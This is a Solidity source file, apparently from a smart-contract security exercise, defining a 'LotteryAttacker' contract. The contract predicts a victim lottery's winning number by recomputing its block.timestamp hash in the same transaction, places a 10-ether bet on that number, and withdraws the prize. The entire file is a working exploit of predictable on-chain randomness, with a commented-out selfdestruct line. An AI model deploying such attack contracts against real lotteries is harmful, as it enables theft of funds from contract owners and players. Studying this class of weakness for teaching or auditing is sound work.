// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ILottery {
    function placeBet(uint8 _number) external payable;
    function withdrawPrize() external;
}

contract LotteryAttacker is Ownable {
    ILottery private victim;

    constructor(address _victim) {
        victim = ILottery(_victim);
    }

    function attack() external payable onlyOwner {
        uint8 winningNumber = getWinningNumber();
        victim.placeBet{ value: 10 ether}(winningNumber);
    }

    function getWinningNumber() private view returns(uint8) {
        return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1; 
    }

    function withdraw() external {
        console.log("xxx");
        victim.withdrawPrize();
        //selfdestruct(payable(msg.sender)); 
    }
}